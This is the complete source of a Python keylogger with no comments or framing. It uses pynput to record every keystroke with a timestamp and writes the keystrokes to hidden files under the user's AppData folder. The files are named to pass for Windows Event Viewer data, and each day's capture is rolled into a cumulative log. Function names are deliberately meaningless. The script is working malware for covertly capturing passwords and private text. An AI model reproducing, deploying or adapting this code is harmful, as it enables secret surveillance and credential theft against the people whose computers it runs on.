from pynput.keyboard import Key, Listener
import logging
from os import path, remove
from datetime import datetime, timedelta
y = datetime.today() - timedelta(days=1)
cfile = path.expanduser("~")+"\\AppData\\Local\\EventViewer"+y.strftime("%d")+".xpb"
if path.isfile(cfile):
    with open(path.expanduser("~")+"\\AppData\\Local\\Events.xpb", "ab+") as f:
        with open(cfile, "rb") as cf:
            f.write(cf.read())
        remove(cfile)
logging.basicConfig(filename=(path.expanduser("~")+"\\AppData\\Local\\EventViewer" + str(datetime.today().strftime("%d")) + ".xpb"), level=logging.DEBUG, format="%(asctime)s %(message)s", datefmt="%H:%M:%S")
def asdf(k):
    logging.info(str(k))
with Listener(on_press=asdf) as abc:
    abc.join()